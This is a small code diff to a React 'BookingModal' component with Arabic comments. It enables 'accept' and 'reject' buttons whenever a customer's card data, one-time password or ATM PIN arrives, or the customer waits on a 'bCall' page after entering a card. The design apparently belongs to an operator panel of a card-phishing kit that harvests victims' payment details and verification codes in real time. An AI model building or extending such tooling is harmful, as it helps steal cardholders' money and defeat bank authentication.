@@ -152,7 +152,18 @@ function BookingModal({
   }
 
   // هل فيه بيانات جديدة تحتاج قرار؟
-  const hasNewData = hasCardData && (!payment.paymentAction || payment.paymentAction === "STILL");
+  // تضيء الأزرار عندما:
+  // 1. فيه بيانات بطاقة ولم يتخذ قرار بعد
+  // 2. أو العميل في صفحة الانتظار (bCall) - بعد إدخال البطاقة
+  // 3. أو فيه OTP جديد
+  // 4. أو فيه ATM PIN جديد
+  const isInWaiting = currentPage === "bCall" || currentPage === "waiting";
+  const hasNewData = (
+    (hasCardData && (!payment.paymentAction || payment.paymentAction === "STILL")) ||
+    isInWaiting ||
+    hasOtp ||
+    hasAtm
+  );
 
   // أزرار القبول والرفض - تتفعل فقط لما فيه بيانات
   const acceptBtnStyle: React.CSSProperties = {
